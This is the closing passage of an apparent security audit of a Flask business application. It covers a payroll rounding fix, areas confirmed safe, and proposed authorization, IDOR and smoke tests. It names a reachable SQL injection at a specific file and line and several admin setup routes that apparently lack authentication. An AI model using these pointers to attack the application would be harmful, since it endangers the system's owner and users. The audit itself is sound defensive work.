- ☐ **L-esic** — ESIC rounds before dividing by 100, diverging from the stored-value path (`hr_routes.py:2164-2166`). **Fix:** verify config unit; round after division.

---

## Verified NOT vulnerable (do not spend time here)
- **SQL injection** — only `supplier_routes.py:99` is reachable (C-SQLi). All other queries use SQLAlchemy bound params; `.ilike(f'%{x}%')` builds only the parameter value. `packing_routes.py:113/391` are static literals.
- **Path traversal** — all `send_file`/`send_from_directory` use server-generated/`secure_filename` paths or in-memory `BytesIO`; QC COA path is sanitized at write time. (Add a containment check on `qc_routes.py:344-363` for defense-in-depth.)
- **`render_template_string`/`eval`/`exec`/`os.system`** — none in application code.
- **User-management CRUD** (`/admin/users/*`) correctly enforces `@admin_required` server-side.
- **Password hashing** — Werkzeug (scrypt/pbkdf2), not weak.

---

### Suggested regression tests to add (`tests/`)
- Negative authz: a `role='user'` session hitting each privileged endpoint expects 403 (lead/employee/PO/GRN/master/mail).
- IDOR: user A cannot read/modify user B’s lead/sample-order/employee/project by id.
- Auth: `/setup`, `/seed-modules`, `/fix-admin-perms`, `/hr/attendance/qr-lookup` reject unauthenticated/non-admin.
- Smoke: every GET route returns < 500 for admin (re-run `scripts/diagnostics/qa_audit_probe.py`).
